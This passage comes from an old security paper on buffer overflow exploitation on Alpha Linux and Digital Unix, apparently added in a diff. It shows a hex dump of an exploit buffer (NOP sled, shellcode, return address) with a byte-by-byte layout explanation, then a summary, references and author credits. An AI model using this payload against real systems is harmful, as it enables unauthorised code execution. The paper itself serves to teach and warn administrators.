+  592  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  608  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  624  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  640  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  656  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  672  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  688  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  704  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  720  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  736  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  752  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  768  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  784  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  800  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  816  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  832  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  848  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  864  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  880  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  896  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  912  04 ff 47 30 15 d9 43 11 74 f0 47 12 14 02 42 fc      ..G0..C.t.G...B.
+  928  ff 32 b2 12 94 09 42 fc ff 32 b2 ff 47 3f 26 1f      .2....B..2..G?&.
+  944  04 31 22 fc ff 30 b2 f7 ff 1f d2 10 04 ff 47 11      .1"..0........G.
+  960  14 e3 43 20 35 20 42 ff ff ff ff 30 15 d9 43 31      ..C 5 B....0..C1
+  976  15 d8 43 12 04 ff 47 40 ff 1e b6 48 ff fe b7 98      ..C...G@...H....
+  992  ff 7f 26 d0 8c 73 22 13 05 f3 47 3c ff 7e b2 69      ..&..s"...G<.~.i
+ 1008  6e 7f 26 2f 62 73 22 38 ff 7e b2 13 94 e7 43 20      n.&/bs"8.~....C 
+ 1024  35 60 42 ff ff ff ff 30 f5 ff 1f 01                  5`B....0....    
+
+0 ~ 2
+ The padding data. It's for alignment. 0, 1, 2, or 3 padding characters are
+needed to align the instructions.
+3 ~ 914
+ nop instructions.
+915 ~ 1030
+ shellcode.
+1031 ~ 1038
+ return address. 0x000000001ffff530 ( "\x30\xf5\xff\x1f\x01\x00\x00\x00" )
+Don't worry about last three '\0' characters. Almost all cases the last
+three characters are '\0'.
+----------------------------------------------------------------------------
+
+9. Buffer overflow exploit in the digital unix
+ The exploit code in this paper works well in the digital unix, too.
+
+10. Summary
+ This paper explain the buffer overflow exploit technique in the alpha linux.
+There are many administrators who doesn't worry about the buffer overflow bug
+because he(or she) administrates not intel x86 linux but alpha linux.
+In addition, some people think that the buffer overflow exploit is impossible
+in the alpha linux. However, it's possible.
+ DON'T BELIEVE THAT BUFFER OVERFLOW EXPLOIT IS IMPOSSIBLE IN THE ALPHA.
+
+
+11. References
+ Alpha Architecture Handbook
+  http://ftp.digital.com/pub/Digital/info/semiconductor/literature/alphaahb.pdf
+
+12. Etc
+ Sorry for my poor English. :(
+
+ Written by Taeho Oh ( ohhara@postech.edu )
+----------------------------------------------------------------------------
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+----------------------------------------------------------------------------
+
+
+                 ------------------------------------------
+                 Special thanks to all of PLUS members. ^_^
+                 ------------------------------------------
+
+
+                        -----------------------------
+                        Special thanks to awkn`n. ^_^
+                        -----------------------------
+
+
+
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
